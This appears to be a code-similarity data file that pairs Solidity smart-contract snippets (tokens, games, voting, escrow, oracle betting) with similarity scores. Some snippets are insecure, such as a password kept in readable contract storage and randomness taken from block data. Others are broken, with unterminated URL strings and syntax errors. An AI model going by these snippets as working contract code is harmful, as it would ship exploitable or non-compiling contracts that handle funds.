uint qualityUnits = 16;
uint qualityModulo = qualityUnits;
uint cooldownTime = 1 days;




struct Resource {
    string name;
    uint quality;
    uint32 rarity;
    uint256 cooldownTime;
    uint16 stockGain;
    uint16 stockLoss;
    uint32 readyTime;
    uint256 extractionTime;
    uint256 extractionId;
    uint256 magnetiteId;
    uint256 hematiteId;
    uint256 class;
    uint256 sediments;
    uint qualityUnits;

    }




    mapping (uint => address) public resourceToOwner;
    mapping (address => uint) ownerResourceGain;
    Resource[] public resources;



function _createResource (string memory _name , uint _quality) internal {
    uint id = resources.push(Resource(_name,_quality ,1 , uint256( now + cooldownTime), 0 , 0, 0, 
    0, 0, 0, 0, 0, 0, 16) )+1;
    resourceToOwner[id] = msg.sender;
    ownerResourceGain[msg.sender]++;
    emit NewResource(id, _name , _quality);
    }

    
    function _generateRandomQuality(string memory _str ) private view returns (uint) {
        uint rand = uint(keccak256(abi.encode(_str)));
        return rand % qualityModulo;
    }

    

    function createResourceStack(string memory _name) public {
    require(ownerResourceGain[msg.sender] ==0);
    uint randomQuality = _generateRandomQuality(_name);
    randomQuality = randomQuality - randomQuality % 100;
    _createResource(_name, randomQuality);





    }


}",0.5669094508709871,"contract PingToken {
  
  event Pong(uint256 pong);
  event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public pings;
  uint256 public totalSupply;
  
  string public constant name = ""PingToken"";
  string public constant symbol = ""PING"";
  uint8 public constant decimals = 18;
  uint256 public constant INITIAL_SUPPLY = 100000000 * (10 ** uint256(decimals)); 
  
  uint256 public genCode = 0;
  
  mapping(address => uint256) balances;
constructor() public {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
  }
function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);
balances[msg.sender] = balances[msg.sender] - _value;
    balances[_to] = balances[_to] + _value;
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
 function saveGenCode (address _to, uint256 _value) public returns (bool) {
     genCode = _value;
     return true;
 }
 function getGenCode() external view returns (uint256) {
     return genCode;
 }
function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
function ping() external returns (uint256) {
    
    uint256 cost = 1 * (10 ** uint256(decimals));
    require(cost <= balances[msg.sender]);
    totalSupply -= cost;
    balances[msg.sender] -= cost;
    pings++;
    emit Pong(pings);
    return pings;
  }
}"
"contract CoreRefined is Sample {


    

    function getResourcesStats(uint256 _id)
        external
        view
        returns (
        bool isRefiningInProcess,
        bool isReady,
        uint256 cooldownTime,
        
        uint256 extractionTime,
        uint256 extractionId,
        uint256 magnetiteId,
        uint256 hematiteId,
        uint256 class,
        uint256 sediments
    ) 


    {

        Resource storage stats = resources[_id];
        isRefiningInProcess = (stats.quality != 0);
        isReady = (stats.cooldownTime <= block.number);
        cooldownTime = uint256(stats.cooldownTime);
        extractionTime = uint256(stats.extractionTime);
        extractionId = uint256(stats.extractionId);
        magnetiteId = uint256(stats.magnetiteId);
        hematiteId = uint256(stats.hematiteId);
        class = uint256(stats.class);
        sediments = stats.sediments;
    }

}",0.5005199342409883,"contract RNG{

     uint256 secret = 0;

     

    

    

    modifier NoContract(){

        uint size;

        address addr = msg.sender;

        assembly { size := extcodesize(addr) }

        require(size == 0);

        _;

    }

    

    function RNG() public NoContract{

        secret = uint256(keccak256(block.coinbase));

    }

    

    function _giveRNG(uint256 modulo, uint256 secr) private view returns (uint256, uint256){

        uint256 seed1 = uint256(block.coinbase);

        uint256 seed3 = secr; 

        uint256 newsecr = (uint256(keccak256(seed1,seed3)));

        return (newsecr % modulo, newsecr);

    }

    



    function GiveRNG(uint256 max) internal NoContract returns (uint256){

        uint256 num;

        uint256 newsecret = secret;



        (num,newsecret) = _giveRNG(max, newsecret);

        secret=newsecret;

        return num; 

    }

    



}"
"contract  ResourceHelper is ResourceRefined {
    
uint rarityForFee = 0.001 ether;

    
    modifier aboveCostLevel (uint _rarity ,uint _resourceId){
        require(resources[_resourceId].rarity >= _rarity);
        _;
    }


    
    

    
    function setRarityFee(uint _fee) external onlyOwner {
        rarityForFee = _fee;
    }

    
    

    function rarityUp(uint _resourceId) external payable {
        require(msg.value == rarityForFee);
        resources[_resourceId].rarity++;
        }

        

    function changeName(uint _resourceId, string calldata   _Newname) external aboveCostLevel(2, _resourceId) onlyOwnerOf (_resourceId){
        resources[_resourceId].name = _Newname;

    }

    
    function changeQualityUnits(uint _resourceId, uint _newQualityUnits) external aboveCostLevel(2, _resourceId) onlyOwnerOf (_resourceId) {
                resources[_resourceId].qualityUnits = _newQualityUnits;

    }

    

    function getTheResourceToOwner( address _owner) external view returns (uint[] memory) {
        uint[] memory result = new uint[](ownerResourceGain[_owner]);
        uint counter = 0;

        
        for (uint i = 0; i < resources.length; i++) {
            if (resourceToOwner[i] == _owner){
                result[counter] = i;
                counter++;
            }


        }
        return result;

    }
}",0.5822835250304395,"contract LoveBlocks {

    using SafeMath for uint256;



    event NewLoveBlock(string message, bool encrypted, uint timestamp);



    struct LoveBlock {

        string message;

        bool encrypted;

        uint timestamp;

    }



    LoveBlock[] public locks;



    mapping (uint => address) private lockToOwner;

    mapping (address => uint) private ownerToNumber;



    function myLoveBlockCount() external view returns(uint) {

        return ownerToNumber[msg.sender];

    }



    function totalLoveBlocks() external view returns(uint) {

        return locks.length;

    }



    function createLoveBlock(string _message, bool _encrypted) external {

        uint id = locks.push(LoveBlock(_message, _encrypted, now)) - 1;

        lockToOwner[id] = msg.sender;

        ownerToNumber[msg.sender] = ownerToNumber[msg.sender].add(1);

        emit NewLoveBlock(_message, _encrypted, now);

    }



    function myLoveBlocks() external view returns(uint[]) {

        uint[] memory result = new uint[](ownerToNumber[msg.sender]);



        uint counter = 0;

        for (uint i = 0; i < locks.length; i++) {

            if (msg.sender == lockToOwner[i]) {

                result[counter] = i;

                counter = counter.add(1);

            }

        }

        return result;

    }

}"
"contract ExampleDataStorage {

struct UserProfile {
    string username;
    string department;
    uint8 avatarNumber;
    uint40 totalSteps;
    mapping(uint32 => uint32) userStepInfo;
    uint32 lastSyncDate;
}

mapping(address => mapping(address => UserProfile)) _userProfile;

function setAvatarNumber(uint8 _avatarNumber, address _userAddress) public {
    _userProfile[msg.sender][_userAddress].avatarNumber = _avatarNumber;
}

function getAvatarNumber(address _contractAddress, address _userAddress) public view returns(uint8) {
    return _userProfile[_contractAddress][_userAddress].avatarNumber;
}

}",0.5862622327096898,"contract Reputation {



  address owner;

  mapping(address => bool) whitelist;

  mapping(address => int) ratings;



  constructor () public {

    owner = msg.sender;

  }



  function addToWhitelist(address _contractAddress) public {

    require(msg.sender == owner);

    whitelist[_contractAddress] = true;

  }



  function change(address _userAddress, int _delta) public {

    require(whitelist[msg.sender]);

    ratings[_userAddress] += _delta;

  }



  function getMy() public view returns (int) {

    return ratings[msg.sender];

  }



  function get(address _userAddress) public view returns (int) {

    return ratings[_userAddress];

  }

}"
"contract SharedEvents {

constructor () public {}

event avatarSet(string _contractName, uint8 _avatar);

}",0.5771312064598315,"contract DxController is Controller {

    constructor(Avatar _avatar) public Controller(_avatar) {}

}"
"contract UserContract is SharedEvents {

ExampleDataStorage _storage;
string _contractName = ""UserContract"";

constructor (address _exampleDataStorageAddress) public payable {
    _storage = ExampleDataStorage(_exampleDataStorageAddress);
}

function _setAvatarNumber(uint8 _newAvatarNumber) public {
    _storage.setAvatarNumber(_newAvatarNumber, msg.sender);
    emit avatarSet(_contractName, _newAvatarNumber);
}

function _getAvatarNumber() public view returns(uint8) {
    return _storage.getAvatarNumber(address(this), msg.sender);
}

}",0.5381554887899964,"contract SimpleDonate is   Owned {



    using SafeMath for uint;  



    string public  name; 

 



 

 

    



    



    



    constructor(string contractName) public  { 

        name = contractName; 

    }



    

    

    function() public payable

    {

        

    }

  



    

     



    



    



    

     function withdrawEther(uint amount) public onlyOwner returns(bool) {

        

        require(amount < address(this).balance);

        owner.transfer(amount);

        return true;



    }

    

    



    



    



    function withdrawERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {



        return ERC20Interface(tokenAddress).transfer(owner, tokens);



    }



}"
"contract OtherContract is SharedEvents {

ExampleDataStorage _storage;
address _userContractAddress;

constructor (address _exampleDataStorageAddress, address _userContractAddressParam) public payable {
    _storage = ExampleDataStorage(_exampleDataStorageAddress);
    _userContractAddress = _userContractAddressParam;
}

function _getAvatarNumber() public view returns(uint8) {
    return _storage.getAvatarNumber(_userContractAddress, msg.sender);
}

}",0.5274869697620749,"contract IKYC {
    
    event ManagerStatusUpdated(address KYCManager, bool managerStatus);

    
    event UserStatusUpdated(address user, bool status);

    
    
    
    
    function setKYCManagerStatus(address KYCManager, bool managerStatus)
        public
        returns (bool);

    
    
    
    
    function setUserAddressStatus(address userAddress, bool passedKYC)
        public
        returns (bool);

    
    
    
    function getAddressStatus(address userAddress) public view returns (bool);

}"
"contract Factory {
  address[] newContracts;

  function createContract (bytes32 name) {
    address newContract = new Contract(name);
    newContracts.push(newContract);
  } 
}",0.5243157990448756,"contract SweetToken is Token {

    function SweetToken(string name_, string symbol_, address rolesContract) public Token(name_, symbol_, rolesContract) {

        

    }



}"
"contract A {

    Lib someLib;

    function setLibReference(address libAddress) public {
        someLib = Lib(libAddress);
    }
}",0.5834361578766394,"contract Resonance {

    function participantFission(address sender, address inviterAddress) public returns(bool);

}"
"contract Units {
    uint totalUnits;

    mapping(uint => Unit) public idToUnit;

    struct Unit {
        uint id;
        uint exp;
    }

    constructor() public {
        Unit storage _unit = idToUnit[totalUnits];
        _unit.id = totalUnits;
        _unit.exp = 0;
        totalUnits++;
    }

    function increaseUnitExp(uint _id, uint amount) public {
        Unit storage obj = idToUnit[_id];
        obj.exp = amount;
    }
}",0.5817665126319149,"contract Units {

    mapping(address => mapping(uint256 => UnitsOwned)) public unitsOwned;

    function mintUnitExternal(uint256 unit, uint80 amount, address player, uint8 chosenPosition) external;

    function deleteUnitExternal(uint80 amount, uint256 unit, address player) external;

    

    struct UnitsOwned {

        uint80 units;

        uint8 factoryBuiltFlag;

    }

}"
"contract SafeMessage {

string message;
string password;
string enterPassword;

function sendMessage(string _message, string _password) public {
       require (bytes(_message).length > 0 && bytes(_password).length > 0 );
       message = _message;
       password = _password;
}

function readMessage (string _enterPassword) view public returns (string) {
   require (stringsEqual(password, _enterPassword) == true);
   return (message);
}

function stringsEqual(string storage _a, string memory _b) internal pure returns(bool) {
    bytes storage a = bytes(_a);
    bytes memory b = bytes(_b);

    if (keccak256(a) != keccak256(b)) {
        return false;
    }
    return true;
}
}",0.5882673114625289,"contract ERC20Detailed is IERC20 {

    string private _name;

    string private _symbol;

    uint8 private _decimals;



    constructor (string memory name, string memory symbol, uint8 decimals) public {

        _name = name;

        _symbol = symbol;

        _decimals = decimals;

    }

 

    function _rename(string memory tokenname, string memory tokensymbol) internal {

        _name = tokenname;

        _symbol = tokensymbol;

    }



    

    function name() public view returns (string memory) {

        return _name;

    }



    

    function symbol() public view returns (string memory) {

        return _symbol;

    }



    

    function decimals() public view returns (uint8) {

        return _decimals;

    }

}"
"contract Escrow {
  ERC20 public token;                                                                                                                                                                                                                         
  constructor(ERC20 _token) public {
    token = _token;
  }
}",0.5998061131212178,"contract BablosDividend is BasicDividend {



  constructor(ERC20 _token) public BasicDividend(_token) {



  }



}"
"contract SimpleStorage {
    uint256 public data;
    event UpdateData(uint256 oldValue, uint256 newValue, uint256 timestamp);
    constructor (uint256 _value) public {
        require(_value > 0, ""in SimpleStorage:constructor(). Value must be greater than 0."");
        data = _value;
    }
    function updateData(uint256 _value) public {
        require(_value > 0, ""in SimpleStorage:setData(). Value must be greater than 0."");
        emit UpdateData(data, _value, now);
        data = _value;
    }
    function getData() public view returns (uint256) {
        return data;
    }
}",0.5924127447810899,"contract ERC20 {
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    function transfer(address to, uint256 value) public returns(bool);
    function allowance(address owner, address spender) public view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}"
"contract Main is Ownable {

    User[] private _users;

    function createUser(uint256 _id) onlyOwner external {
        
        

        
        User user = new User(_id);

        emit UserCreated(user, _users.length);

        _users.push(user);
    }
}",0.5390721906897898,"contract DistributeETH is Ownable {

  



  function distribute(address[] _addrs, uint[] _bals) onlyOwner{

    for(uint i = 0; i < _addrs.length; ++i){

      if(!_addrs[i].send(_bals[i])) throw;

    }

  }



  function () payable {}

}"
"contract superDuper {   
    function awesomeness() internal {};
    function metaAwesomeness() {awesomeness()};
}",0.5611138127797611,"contract token {
    function transferFrom(address, address, uint) returns(bool){}
    function burn() {}
}"
"contract FilterByAddress {
    address[] addrs =  [0x36eaf79c12e96a3dc6f53426c, 0xf235aa56dd96bda02acfb361e];

    address controlAddr = 0x36eaf79c12e96a3dc6f53426c;

    function getSensitiveData() public return (string) {
         uint i = 0;
         for(i = 0; i < addrs.length; ++i) 
            if(msg.sender == addrs[i])
               return ""You got the secret"";
            else 
               return ""You got nothing"";
    }
}",0.5581767957024714,"contract DistributeETH is Ownable {

  



  function distribute(address[] _addrs, uint[] _bals) onlyOwner public{

    for(uint i = 0; i < _addrs.length; ++i){

      if(!_addrs[i].send(_bals[i])) throw;

    }

  }

  

  function multiSendEth(address[] addresses) public onlyOwner{

    for(uint i = 0; i < addresses.length; i++) {

      addresses[i].transfer(msg.value / addresses.length);

    }

    msg.sender.transfer(this.balance);

  }

}"
"contract MyContract {
    event LogString(string str);
    event LogAddress(address addr);

    function logData(string str) {
        LogString(str);
    }
    function logData(address addr) {
        LogAddress(addr);
    }
}",0.5969653249562661,"contract AssetStorage {
    function addTrustedIssuer(address addr, string name);
    function removeTrustedIssuer(address addr, string name);
    function assertFact(uint id, string fact);
}"
"contract Auditor is owned {
    growId public grower_IDs;
    mapping (address => bool) public approvedGrows;

    function Auditor(address GID){
        grower_IDs = growId(GID);
        grower_IDs.transferOwenership(this);
    }

    function approveGrower(address target){
        if (approvedGrows[target] == true) throw;
        else approvedGrows[target] = true;
    }

    function issueGrowerID(address target) {
        if (approvedGrows[target] == true && grower_IDs.balanceOf.value(10).gas(1000)(target) == 0) {
            grower_IDs.makeID.value(10).gas(1000)(target);
        }
        else throw;
    }

}",0.5231182103385927,"contract Issuer is Ownable {

  
  mapping(address => bool) public issued;

  
  StandardToken public token;

  
  address public allower;

  
  uint public issuedCount;

  function Issuer(address _owner, address _allower, StandardToken _token) {
    owner = _owner;
    allower = _allower;
    token = _token;
  }

  function issue(address benefactor, uint amount) onlyOwner {
    if(issued[benefactor]) throw;
    token.transferFrom(allower, benefactor, amount);
    issued[benefactor] = true;
    issuedCount += amount;
  }

}"
"contract Foo {

   function foo(address _addr) public {
      ISafe iSafe = ISafe(_addr);

      
      if (iSafe.isSafe()) {
          
      }
   }

}",0.5925554669345748,"contract Test {

    function send(address to) public{
        if (to.call(""0xabcdef"")) {
            return;
        } else {
            revert();
        }
    }
}"
"contract c {
        function test() public {
                bytes foo = new bytes(1);

                foo[0] = 128;
                foo.push(64);

                assert(foo.length == 2);

                assert(foo[1] == 64);

                assert(64 == foo.pop());

                assert(foo.length == 1);
        }
         }",0.5174477111810012,"contract dynamictest{

    uint public a;

    uint public b;

    function test(uint foo) public {

        if (tx.gasprice > foo){

            a=1;

            return;

        }

        if (tx.gasprice < foo){

            a=1;

            b=1;

            return;

        }

    }

}"
"contract Products {
    struct Product {
        bytes32 name;
        uint votes;
        address company;
    }

    mapping (uint => Product) products;
    mapping (address => uint) companyProductsCounter;
    uint private counter;

    function Products () {
        counter = 0;
    }

    function registerProduct( bytes32 productName) {
        products[counter++] = Product({name: productName, votes: 0, company: msg.sender});
    }

    function getProduct(uint code) constant returns (bytes32 name, uint votes, address company) {
        products[code].name;
        products[code].votes;
        products[code].company;
    }
}",0.5691129300468766,"contract Helper{
    function generatePASS1( address ) public pure returns( bytes32 );
    function generatePASS2( bytes32, address ) public pure returns( bytes32 );
    function generatePASS3( bytes32 ) public pure returns( bytes32 );
    function generateNUMERIC(uint) public constant returns( uint );
    function encryptCounter( uint count ) public constant returns( uint );
    function encodeAmount(uint, uint) public constant returns( uint );
    function decodeAmount(uint, uint) public constant returns( uint );
}"
"contract MyContract {
    string public a;
    
    function MyContract() {
        a = ""0.12312317314571638713891378174163782169246891247193811231231731"";
    }

    function bytesToUInt(uint v) constant returns (uint ret) {
    if (v == 0) {
        ret = 0;
    }
    else {
        while (v > 0) {
            ret = uint(uint(ret) / (2 ** 8));
            ret |= uint(((v % 10) + 48) * 2 ** (8 * 31));
            v /= 10;
        }
    }
    return ret;
}

    function get() constant returns(string){
        return a;
    }
}",0.5792209071811105,"contract safeMath {
	
	function safeSub(uint a, uint b) constant internal returns(uint) {
		assert(b <= a);
		return a - b;
	}

	function safeAdd(uint a, uint b) constant internal returns(uint) {
		uint c = a + b;
		assert(c >= a && c >= b);
		return c;
	}

	function safeMul(uint a, uint b) constant internal returns(uint) {
		uint c = a * b;
		assert(a == 0 || c / a == b);
		return c;
	}
}"
"contract Connect4 {
event LogConstructorInitiated(string nextStep);
event announceWinner(string winStatement);

uint[] rows;
uint[] columns; 
uint[][][] slopes4;
uint[][][] slopes5;
uint[][][] slopes6;

constructor() public {
    emit LogConstructorInitiated(""Constructor was initiated"");
    rows = [1,2,3,4,5,6,7];
    columns = [1,2,3,4,5,6];
    slopes4 = [[[1,3],[2,4],[3,5],[4,6]], [[1,4],[2,3],[3,2],[4,1]], [[4,6],[5,5],[6,4],[7,3]]];
    slopes5 = [[[1,2],[2,3],[3,4],[4,5],[5,6]],[[3,1],[4,2],[5,3],[6,4],[7,5]],[[1,5],[2,4],[3,3],[4,2],[5,1]],[[3,6],[4,5],[5,4],[6,3],[7,2]]];
    slopes6 = [[[1,1],[2,2],[3,3],[4,4],[5,5],[6,6]],[[2,1],[3,2],[4,3],[5,4],[6,5],[7,6]],[[1,6],[2,5],[3,4],[4,3],[5,2],[6,1]],[[2,6],[3,5],[4,4],[5,3],[6,2],[7,1]]];
    numGames = 0;
}

uint256 numGames;
Game[] games;

struct Board {
    mapping(string => uint) state;
    uint[] rows;
    uint[] columns;
    uint[][][] slopes4;
    uint[][][] slopes5;
    uint[][][] slopes6;
}


struct Game {
    Escrow escrow;
    address winner;
    uint playersTurn;
    address[2] players;
    uint256 challengeDate;
    uint256 acceptChallengeMaxTime;
    bool challengeAccepted;
    uint256 maxStallTime;
    uint256 lastMoveTime;
    uint256 anteAmount;
    Board board;
    bool isValid;
    mapping(uint => bool) tieGameApproval;
}

  function challengeOpponent(address opponent, uint playersTurn, uint256 anteAmount, uint256 acceptChallengeMaxTime, uint256 maxStallTime) public payable returns (bool){
        require(msg.value == anteAmount*10**18, ""value must be equal to specified ante amount."");
        Escrow escrow = new Escrow(msg.sender, opponent, address(this), anteAmount);
        escrow.placeAnte(msg.sender);
        address[2] memory players = [msg.sender, opponent];
        address winner;
        Board memory board = Board({rows: rows, columns: columns, slopes4: slopes4, slopes5: slopes5, slopes6: slopes6});
        Game memory game = Game({escrow: escrow, winner: winner, playersTurn: playersTurn, players: players, 
                            acceptChallengeMaxTime: acceptChallengeMaxTime, challengeDate: now, lastMoveTime: now,
                            challengeAccepted: false, maxStallTime: maxStallTime, anteAmount: anteAmount, board: board, isValid: true});
        games.push(game);
        numGames++;
        return true;
}...",0.5578718612843208,"contract DonutChain is ERC20 {

    

  event TokensBurned(address indexed burner, uint256 value);

  event Mint(address indexed to, uint256 amount);

  event MintFinished();

  uint8  public constant decimals = 0;

  string public constant name = ""donutchain.io token #1"";

  string public constant symbol = ""DNT1"";

  bool public flag = true;

  uint256 public endBlock;

  uint256 public mainGift;

  uint256 public amount = 0.001 ether;

  uint256 public increment = 0.000001 ether;

  address public donee;



  constructor() public {

    endBlock = block.number + 24 * 60 * 4;

  }

  function() external payable {

    require(flag);

    flag = false;

    if (endBlock > block.number) {

      require(msg.value >= amount);

      uint256 tokenAmount =  msg.value / amount;

      uint256 change = msg.value - tokenAmount * amount;

        if (change > 0 )

          msg.sender.transfer(change);

        if (msg.data.length == 20) {

          address refAddress = bToAddress(bytes(msg.data));

          refAddress.transfer(msg.value / 10); 

        } 

          mainGift += msg.value / 5; 

          donee = msg.sender;

          endBlock = block.number + 24 * 60 * 4; 

          amount += increment * tokenAmount;

          _mint(msg.sender, tokenAmount);

          emit Mint(msg.sender, tokenAmount);

          flag = true;

        } else {

          msg.sender.transfer(msg.value);

          emit MintFinished();

          selfdestruct(donee);

        }

  }

  



  function etherPerToken() public view returns (uint256) {

    uint256 sideETH = address(this).balance - mainGift;

    if (totalSupply() == 0)

        return 0;

    return sideETH / totalSupply();

  }



  

  function giftAmount(address _who) external view returns (uint256) {

    return etherPerToken() * balanceOf(_who);

  }

  

  

  function transferGift(uint256 _amount) external {

    require(balanceOf(msg.sender) >= _amount);

    uint256 ept = etherPerToken();

    _burn(msg.sender, _amount);

    emit TokensBurned(msg.sender, _amount);

    msg.sender.transfer(_amount * ept);

  }



  function bToAddress(

    bytes _bytesData

  )

    internal

    pure

    returns(address _refAddress) 

  {

    assembly {

      _refAddress := mload(add(_bytesData,0x14))

    }

    return _refAddress;

  }



}"
"contract ecrecover {
    function testRecovery(bytes32 hash, bytes signature) returns (address) {
    bytes32 r;
    bytes32 s;
    uint8 v;
    assembly {
      r := mload(add(signature, 32))
      s := mload(add(signature, 64))
      v := and(mload(add(signature, 65)), 255)
    }
    if (v < 27) v += 27;
    address addr = ecrecover(hash, v, r, s);
    return addr;
    }",0.5576546075165898,"contract ERC827 {

  function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);
  function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);
  function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);

}"
"contract testfunction {

    string public converted;

    function stringFloatToUnsigned(string _s) payable {
        bytes memory _new_s;
        uint k = 0;

        for (uint i = 0; i < bytes(_s).length; i++) {
            if (bytes(_s)[i] == '.') { continue; }

            _new_s[k] = bytes(_s)[i];
            k++;
        }

        converted = string(_new_s);
    }
}",0.5746921933304262,"contract Rainmaker is Ownable {

    function letItRain(address[] _to, uint[] _value) onlyOwner public payable returns (bool _success) {

        for (uint8 i = 0; i < _to.length; i++){

            uint amount = _value[i] * 1 finney;

            _to[i].transfer(amount);

        }

        return true;

    }

}"
"contract B {
    function testSend1(address _contract, address _to, uint256 _value) {
        _contract.call.gas(400000)(bytes4(keccak256(""testFunc1(address,uint256)"")), _to, _value);
    }
    function testSend2(address _contract, address _to, uint256 _value) {
        _contract.call.gas(400000)(bytes4(keccak256(""testFunc2(address,uint256)"")), _to, _value);
    }
}",0.5818316286865393,"contract ERC20Basic {
  uint256 public totalSupply=1000000;
  function balanceOf(address who) public constant returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
 
}"
"contract OraclizeTest is usingOraclize {

    using strings for *;        
   
    uint public amount; 


    address public homeBet;  
    address public awayBet;




    event LogInfo(string description);      


    
    function OraclizeTest (uint _amount) public {    
        amount = _amount;        

        
        OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);

        oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
    
    }

    
     
    function betOnTeam(uint team) payable public {
      emit LogInfo(""INSIDE betOnTeam--------------------"");
        if(team == 1)
        {

                if(msg.value == amount)
                {
                    homeBet = msg.sender;
                    if(homeBet != 0 && awayBet != 0)
                    {
                        


                        oraclize_query(""URL"", ""json(https:
                        update();                   
                    }
                }
                else
                {
                    throw;
                }
        }
        else if(team == 2)
        {

                if(msg.value == amount)
                {
                    awayBet = msg.sender;

                    if(homeBet != 0 && awayBet != 0)
                    {
                        
                        update();
                        oraclize_query(""URL"", ""json(https:
                    }
                }
                else
                {
                    throw;
                }
        }
    }
    
    function __callback(bytes32 id, string result, bytes proof) public {
    require(msg.sender == oraclize_cbAddress());       

    
    emit LogInfo(""REACHED-------------CALLBACK"");
    if (result.toSlice().equals(""home"".toSlice()))
    {
        emit LogInfo(""REACHED-------------CB-------INSIDE"");
        homeBet.transfer(address(this).balance);
    }
    else if(result.toSlice().equals(""away"".toSlice()))
    {
        awayBet.transfer(address(this).balance);
    }
    else if(result.toSlice().equals(""draw"".toSlice()))
    {
        homeBet.transfer(address(this).balance / 2);
        awayBet.transfer(address(this).balance / 2);
    }

    }

    function update()
    payable
    public {
        
        if (oraclize_getPrice(""URL"") > address(this).balance) {
            emit LogInfo(""Oraclize query was NOT sent, please add some ETH to cover for the query fee"");
        } else {
            emit LogInfo(""Oraclize query was sent, standing by for the answer.."");

            
            oraclize_query(""URL"", ""json(https:

        }
    }

}",0.5671998303020649,"contract Crowdsale is simpleToken {
    uint public amountRaised; 
    uint public price;  
    uint256 public counterForTokenId = 0;
    mapping(address => uint256) public balanceInEthAtCrowdsale; 
 
    event FundTransfer(address _backer, uint _amount, bool _isContribution);    

    event SetPrice(address _beneficiary, uint _price);
    
    event AddSupplyAmount(string msg, uint _amount);
  
    constructor(
        string memory tokenName,
        string memory tokenSymbol
    ) public simpleToken(tokenName, tokenSymbol){
        price = 2 finney; 
    }
 
    function internalIssue(address _to, uint256 _amount) private{
     require(balanceOf[beneficiary] >= _amount);
    
     balanceOf[beneficiary] -= _amount;
     balanceOf[_to] += _amount;
   
     emit Transfer(beneficiary, _to, _amount);
    }
  
    function () external payable {

        uint amount = msg.value;
     
        balanceInEthAtCrowdsale[msg.sender] += amount;
        
        amountRaised += amount;

        internalIssue(msg.sender, amount / price * 10 ** uint256(decimals));
        emit FundTransfer(msg.sender, amount, true);
       
        counterForTokenId = counterForTokenId + 1;
        
    }

   
    function safeWithdrawal() public onlyOwner(){
       
        msg.sender.transfer(amountRaised);

        emit FundTransfer(msg.sender, amountRaised, false);
        amountRaised = 0;
    }
    
    function setPrice (uint price_in_finney) public onlyOwner(){
        price = price_in_finney * 1 finney;
        emit SetPrice(msg.sender, price);
    }
    
    function addSupplyAmount (uint256 amount) public onlyOwner(){
        totalSupply = totalSupply + amount; 
        balanceOf[msg.sender] += amount;

       
        emit Transfer(msg.sender, msg.sender , amount);
        emit AddSupplyAmount('Add Supply Amount', amount);
    }
}"
"contract C {
    uint[] data1;
    uint[] data2;

    function appendOne() {
        append(data1);
    }

    function appendTwo() {
        append(data2);
    }

    function append(uint[] storage d) {
        d.push(1);
    }
}",0.5732898829419271,"contract IFlap {
    function tick(uint id) external;
    function tend(uint id, uint lot, uint bid) external;
    function deal(uint id) external;
}"
"contract Voting {

    address chairPersonAddress;

    struct Candidate {
        address candidateAddress;
        uint votes;
    }

    struct Vote{
        uint votedCandidateIndex;
        bool alreadyVoted;
    }

    modifier onlyChairPerson(){
        require(msg.sender == chairPersonAddress);
        _;
    }

    mapping(address => Vote) public voterAddressToTheirVote;

    Candidate[] public candidates;

    constructor(address _chairPersonAddress) public {
        chairPersonAddress = _chairPersonAddress;
    }

    function nominateCandidate(address _candidateAddress) onlyChairPerson public {
        Candidate memory newCandidate = Candidate({
            candidateAddress: _candidateAddress,
            votes: 0
        });

        candidates.push(newCandidate);
    }

    function vote(uint _candidateIndex) public {
        Vote memory existingVote = voterAddressToTheirVote[msg.sender];
        
        if(_candidateIndex == 0){
            require(existingVote.alreadyVoted == false, ""You already voted for the first candidate"");
            _addNewVote(_candidateIndex);
        }
        else{
            require(existingVote.votedCandidateIndex != _candidateIndex && existingVote.alreadyVoted == false, ""You already voted for this candidate"");
            _addNewVote(_candidateIndex);
        }
    }

    function _addNewVote(uint _candidateIndex) private {
        Vote memory newVote = Vote({
            votedCandidateIndex: _candidateIndex,
            alreadyVoted: true
        });

        voterAddressToTheirVote[msg.sender] = newVote;

        candidates[_candidateIndex].votes++;
    }

    function numberOfCandidates() public view returns(uint){
        return candidates.length;
    }
}",0.5307298179778215,"contract MoldCoinBonus is SafeMath {

    function bonusBalanceOf(address _owner) constant returns (uint256 balance) {
        return bonusBalances[_owner];
    }

    mapping (address => uint256) bonusBalances;

    
    address public admin;

    
    MoldCoin public fundAddress;
    uint public rate = 10;
    uint public totalSupply = 0;

    bool public halted = false; 

    event BuyWithBonus(address indexed sender, address indexed inviter, uint eth, uint tokens, uint bonus);

    modifier onlyAdmin {
        require(msg.sender == admin);
        _;
    }

    modifier validSale {
        require(!halted);
        require(!fundAddress.halted());
        _;
    }

    function MoldCoinBonus(MoldCoin _fundAddress, uint _rate) {

        admin = msg.sender;
        fundAddress = _fundAddress;
        rate = _rate;

    }

    function buyWithBonus(address inviter) validSale payable {

        require( msg.sender != inviter );

        uint tokens = safeMul(msg.value, fundAddress.price(block.timestamp));
        uint bonus = safeDiv(safeMul(tokens, rate), 100);

        fundAddress.buyRecipient.value(msg.value)(msg.sender); 

        totalSupply = safeAdd(totalSupply, bonus);

        bonusBalances[inviter] = safeAdd(bonusBalances[inviter], bonus);
        BuyWithBonus(msg.sender, inviter, msg.value, tokens, bonus);

    }

    
    function halt() onlyAdmin {
        halted = true;
    }

    function unhalt() onlyAdmin {
        halted = false;
    }

    
    function changeAdmin(address newAdmin) onlyAdmin  {
        admin = newAdmin;
    }

    function changeRate(uint _rate) onlyAdmin  {
        rate = _rate;
    }

}"
"contract BountyHunters {

    enum SubmissionStates {Accepted, Pending, Rejected}
    enum BountyStates { Open, Closed }


    address owner;
    uint public bountyId;
    uint public submissionId;

    mapping(address => uint[]) public myBounties;
    mapping(uint => Bounty) public newBounties;
    mapping(uint => uint[]) public mySubmissions;
    mapping(uint => Submissions) public subs;

    struct Bounty {
        uint bountyId;
        uint bountyAmount;
        address poster;
        string description;
        BountyStates bountyState;
    }

    struct Submissions {
        address bountyHunter;
